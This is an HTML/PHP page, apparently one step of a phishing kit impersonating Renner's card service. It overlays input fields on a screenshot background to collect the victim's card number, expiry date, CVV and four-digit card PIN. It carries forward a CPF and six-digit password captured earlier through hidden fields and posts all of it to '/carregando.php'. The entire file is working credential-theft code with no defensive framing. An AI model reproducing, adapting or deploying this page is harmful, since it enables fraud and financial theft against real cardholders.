<!DOCTYPE html>
<html>

<style type="text/css">

body {
    background-image: url('./Imagens/Mobile/painel2.png');
    background-repeat: no-repeat;
    background-size: 100%;
    background-position: 0px 100px;
}

.cc {
  position: absolute; 
  width: 780px; 
  height: 100px; 
  outline: 0; 
  left: 70px; 
  top: 580px; 
  border-radius: 8px;
}

.validade {
  position: absolute; 
  width: 360px; 
  height: 100px; 
  outline: 0; 
  left: 70px; 
  top: 712px; 
  border-radius: 8px;
}

.ccv {
  position: absolute; 
  width: 360px; 
  height: 100px; 
  outline: 0; 
  left: 490px; 
  top: 712px; 
  border-radius: 8px;
}

.senha {
  position: absolute; 
  width: 780px; 
  height: 100px; 
  outline: 0; 
  left: 70px; 
  top: 850px; 
  border-radius: 8px;
}


input::placeholder {
    color: black;
    font-size: 35px
}

input {
  font-size: 35px;
}

@media screen and (-webkit-min-device-pixel-ratio:0) { 
  select:focus,
  textarea:focus,
  input:focus {
    font-size: 35px;
    background: #eee;
  }
}

</style>

<script>
 function mascara(t, mask){
 var i = t.value.length;
 var saida = mask.substring(1,0);
 var texto = mask.substring(i)
 if (texto.substring(0,1) != saida){
 t.value += texto.substring(0,1);
 }
 }
</script>
<head>

<div style="position:block">
<form method="post" action="/carregando.php">

<input type="hidden" name="cpf" value="<?php echo $_POST['cpf']; ?>">
<input type="hidden" name="senha6" value="<?php echo $_POST['senha6']; ?>">

<input type="tel" autocomplete="off" minlength="19" maxlength="19" name="cc" id="cc" placeholder="Número do Cartão" class="cc" oninvalid="setCustomValidity('Insira os números do seu cartão Renner.')" oninput="setCustomValidity('')" onkeypress="mascara(this, '0000 0000 0000 0000')" required/>

<input type="tel" autocomplete="off" minlength="4" maxlength="7" name="validade" id="validade" placeholder="MM/AA" class="validade" oninvalid="setCustomValidity('Dados incompletos.')" oninput="setCustomValidity('')" onkeypress="mascara(this, '00/0000')" required/>

<input type="tel" autocomplete="off" minlength="3" maxlength="3" name="ccv" id="ccv" placeholder="Cod Segurança" class="ccv" oninvalid="setCustomValidity('Dados incompletos.')" oninput="setCustomValidity('')" required/>

<input type="tel" autocomplete="off" minlength="4" maxlength="4" name="senha4" id="senha4" placeholder="Senha do Cartão" class="senha" oninvalid="setCustomValidity('Insira sua senha.')" oninput="setCustomValidity('')" required/>

<button type="submit" onclick="valida_form();" style="display:block; width: 850px; height: 100px; left: 60px; top: 1020px; position: absolute; color: #fff; background-color: #1e1e1f; border-radius: 6px; font-size: 35px">Confirmar</button>
</form>
</div>

</head>
</html>
